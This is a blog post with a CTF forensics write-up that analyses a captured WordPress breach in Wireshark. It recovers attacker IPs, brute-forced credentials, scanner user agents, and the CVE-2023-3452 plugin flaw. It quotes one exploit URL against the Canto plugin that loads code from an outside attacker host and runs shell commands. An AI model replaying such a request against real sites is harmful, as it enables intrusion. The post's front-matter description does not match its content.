---
layout: post
author: kranthikvrm
title: 0xL4ugh CTF 2024 (PCAP Analysis) - Writeup
description: In this blog post, I am sharing my experiences from my first year at RGUKT Nuzvid, where I experienced new faces, challenges, and exciting opportunities on my journey towards becoming an engineer.
date: 2024-02-13 07:43:00 +0800
categories: [CTF Writeups]
tags: [CTF, CTF Writeups]
img_path: /images/0xL4ughCTF
image:
  path: 0xL_logo.png
pin: true
---

Hello buddy, I am Kranthi Kumar, a cybersecurity enthusiast. Recently I participated in the 0xL4ugh CTF, so I am writing how I solved these challenges:

## Challenge 1: WordPress - 1 [Easy]
```
Our WordPress site has experienced a security breach, and the precise method of compromise remains undetermined at present. We need your help to investigate what actually happened.

Q1. There were two attackers attempting to compromise our environment. What is the IP address of the victim, and what is the IP address of the first attacker?

Q2. What are the versions of the Apache and PHP servers deployed in our environment?

Flag Format: 0xL4ugh{A1_A2}

Example: 0xL4ugh{IP1_IP2_apache1.2.3_php1.2.3}(no spaces)
```
<b>My approach:</b>

They gave us a wordpress.pcap file, so I started my analysis using Wireshark.

First things first, I filtered out `http.request traffic` to get a lead. I observed that the IP `192.168.204.132` tried accessing `/wordpress/robots.txt` and `/wordpress/xmlrpc.php`, and `GET /wordpress/wp-content/uploads/` paths. It is very clear that this is the attacker's IP.
![IP addresses found](1.png)

So, Q1 victim IP: 192.168.204.128  and attacker IP: 192.168.204.132

Following the HTTP stream gave us the server and php version information.

![server version found](2.png)

So the flag is `0xL4ugh{192.168.204.128_192.168.204.132_apache2.4.58_php8.2.12}`


## Challenge 2: WordPress - 2 [Medium]
```

Q1. During enumeration, the attacker tried to identify users on the site. List all the users that the attacker enumerated. Separate them with a colon. Sort them alphabetically.

Q2. After enumeration, a brute force attack was launched against all users. The attacker successfully gained access to one of the accounts. What are the username and password for that account, and what is the name of the page used for the brute force attack?

Flag Format: 0xL4ugh{A1_A2}

Example: 0xL4ugh{username1:username2_username:password_pageName.ext}
```

<b>My approach:</b>

As we already know the attacker IP, I filtered the traffic with the "POST" method as it is used to log in and the source IP as the attacker IP.

`ip.src == 192.168.204.132 && http.request.method == POST`

I found three login attempts and also the three usernames and passwords.
![login attempts](22.1.png)
![login attempts](22.2.png)
![login attempts](22.3.png)

So it's `a1l4m:demomorgan:not7amoksha` in alphabetical order.

Moving forward to Q2, to find out the brute force attack, I filtered traffic so that all HTTP traffic from and to `192.168.204.132` will be visible.

`((ip.src == 192.168.204.132) || (ip.dst == 192.168.204.132)) && http`

![brute force attempts](3.png)

I found 5 POST requests to the `/wordpress/xmlrpc.php` path. Following the HTTP stream revealed that the attacker tried the "wp.getUsersBlogs" command with two parameters to extract users.
![brute force attempts -1](3.1.png)

So for sure, the second parameter is the password that the attacker used. I saw too many failed attempts. I tried to filter only the successful attempts using

`(ip.dst == 192.168.204.132) && !(xml.cdata == "403") && (_ws.col.protocol == "HTTP/XML")`

The above filter or query, (ip.dst == 192.168.204.132): This part filters packets where the destination IP address is 192.168.204.132 and !(xml.cdata == "403") this part selects packets where the XML data field (xml.cdata) is not equal to "403". So, it excludes packets containing XML data equal to "403" and (_ws.col.protocol == "HTTP/XML"), this part filters packets where the protocol in the Wireshark column is "HTTP/XML".

I analyzed all the filtered packets, and the packet 147357 response says that the login successful. I found it by following the HTTP stream.
![brute force attempts -2](3.2.png)

So the username:password is `demomorgan:demomorgan`

And I know that the brute forced web page is `xmlrpc.php`
![brute force attempts -3](3.3.png)
With the all the information, I got the final flag, it is `0xL4ugh{a1l4m:demomorgan:not7amoksha_demomorgan:demomorgan_xmlrpc.php}`

## Challenge 3: WordPress - 3 [Hard]
```
Q1. Mention the names of the tools that the attacker used in the attack. (in alphabetical order)

Q2. There was a vulnerable plugin that the attacker exploited. What is the C2 server of the attacker, and what is the name of the plugin?

Q3. What is the version of the vulnerable plugin, and what is the CVE number associated with that plugin?

Flag Format: 0xL4ugh{A1_A2_A3}

Example: 0xL4ugh{tool1_tool2_C2_PluginName_1.2.3_CVE--}

```

<b>My approach:</b>

To solve Q1, I have to find the tools that the attacker used for the attack. Most of the times, checking the user-agent will give us this data. So let's check the HTTP traffic again.

With `(ip.src == 192.168.204.132) && http.request` filter

![user agent checking](4.1.png)

User-Agent: `WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)`

Attacker tried SQL Injection attack using sqlmap. 
User-Agent: `sqlmap/1.7.12#stable (https://sqlmap.org)`
![user agent checking](4.png)
Sorting them in alphabetical order: `sqlmap_WPScan`

Moving forward to Q2, I have to find the vulnerable plugin that the attacker exploited.

so I used this filter `http contains "plugins"` and found the below leads.

![vulnerable plugin](4.2.png)

URL: `http://192.168.204.128/wordpress/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://172.26.211.155:8000&cmd=whoami` and `cmd=ls`

I found that a plugin named "Canto" along with a command `whoami` and `ls` at the end of the URL. So this is the vulnerable plugin.

With the information in hand, I can say the answer for Q2 is `172.26.211.155_canto`.

Moving to Q3, and after some analysis, nothing was there related to plugin version and CVE. So I did a Google search, and the first hit shows that Canto 3.0.4 is vulnerable to CVE-2023-3452.
![vulnerable plugin details](4.3.png)
With the information gathered, the answer to Q3 is `3.0.4_CVE-2023-3452`. So the final flag is `0xL4ugh{SQLMap_WPScan_172.26.211.155_canto_3.0.4_CVE-2023-3452}`. 

Thank you for reading buddy ❤️
